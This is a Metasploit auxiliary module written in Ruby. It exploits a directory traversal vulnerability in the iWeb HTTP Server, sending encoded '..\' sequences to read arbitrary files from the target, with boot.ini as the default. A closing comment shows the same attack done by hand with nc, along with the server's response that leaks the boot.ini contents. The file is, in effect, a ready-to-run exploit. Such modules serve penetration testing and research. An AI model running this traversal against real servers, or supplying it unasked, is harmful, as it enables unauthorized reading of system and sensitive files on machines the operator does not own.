##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary
	
	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	# Scanner mixin should be near last
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'iWeb HTTP Server Directory Transversal Vulnerability',
			'Version'     => '$Revision:  $',
			'Description' => 'This modules exploits the iWeb HTTP Server Directory Transversal Vulnerability',
			# some webcam shit has a similar Server Header see below for actual server header. 
			# default install path C:\Progam Files\Ashley Brown\iWeb\
			'Author'      => 'CG' ,
			'License'     => MSF_LICENSE,
			'References'	=>
				[
					[ 'URL', 'http://packetstormsecurity.org/0912-exploits/iweb-traversal.txt' ],
					[ 'BID', '37228' ],
					[ 'URL', 'http://www.ashleybrown.co.uk/iweb/' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/10331' ]
				]	
		)		
		register_options(
			[
				OptString.new('FILE', [ true,  "The file to view", 'boot.ini']),
				OptString.new('TRAV', [ true,  "Traversal Depth", '..%5C..%5C..%5C']),
			], self.class)
	end

	def run

		begin	
			file = datastore['FILE']
			trav = datastore['TRAV']
			res = send_request_raw({
				'uri'          => '/'+trav+file, 
				'method'       => 'GET'
						}, 10)

			if (res and res.code == 200)
				print_status("Output Of Requested File:\n#{res.body}")
			else
				print_status("Received #{res.code} for #{trav}#{file}")
			end

		#rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		#rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
	
end

# nc 172.16.10.132 80
# GET ..%5C..%5C..%5Cboot.ini HTTP/1.0

# HTTP/1.1 200 OK
# LastModified: 12/22/2005 3:22:59 PM
# Server: iWeb
# Content-Length: 210

# [boot loader]
# timeout=30
# default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
# [operating systems]
# multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Windows Server 2003, Enterprise" /noexecute=optout /fastdetect
